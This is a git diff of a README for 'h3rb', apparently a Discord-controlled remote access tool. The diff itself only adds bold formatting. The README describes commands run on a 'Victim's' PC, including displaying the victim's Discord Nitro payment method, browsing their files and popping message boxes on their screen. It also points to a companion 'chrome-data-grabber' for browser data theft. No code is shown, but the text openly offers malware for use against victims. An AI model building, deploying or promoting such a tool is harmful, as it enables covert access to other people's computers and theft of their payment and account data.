@@ -7,14 +7,15 @@ To use this on your own server, please enter your bots Discord Token on Line 27 
 ![image](https://user-images.githubusercontent.com/75194878/113522663-606a1800-959a-11eb-918b-0bfd02c8fbd1.png)
 
 # Commands 
-h3rb has 15+ built in commands which you can use on a clients PC. *(bot prefix is '>')*
+**h3rb** has 15+ built in commands which you can use on a clients PC. *(bot prefix is '**>**')*
 
-You can access these commands through the *>menu* command. 
+You can access these commands through the ***>menu*** command. 
 
 ![image](https://user-images.githubusercontent.com/75194878/113522675-7b3c8c80-959a-11eb-90a8-0df95358b997.png)
 
 
-  Discord Related Commands:
+
+  **Discord Related Commands:**
 
     >payment
       Displays the Victims Payment Method for Discord Nitro.
@@ -54,7 +55,8 @@ You can access these commands through the *>menu* command.
 
 *(you can also easily implement my chrome-data-grabber into this command ^^)* *(see https://github.com/expIoits/chrome-data-grabber)*
 
-  File Related Commands:
+
+  **File Related Commands:**
   
     >cwd
       Displays the current directories folders and files.
@@ -78,7 +80,8 @@ You can access these commands through the *>menu* command.
    
 ![image](https://user-images.githubusercontent.com/75194878/113523015-1e8ea100-959d-11eb-95e1-4958fc20cad8.png)
 
-  Misc Commands (random):
+
+  **Misc Commands (random):**
   
     >message 
       Opens a message-box on the Victims screen with a message of your choice.
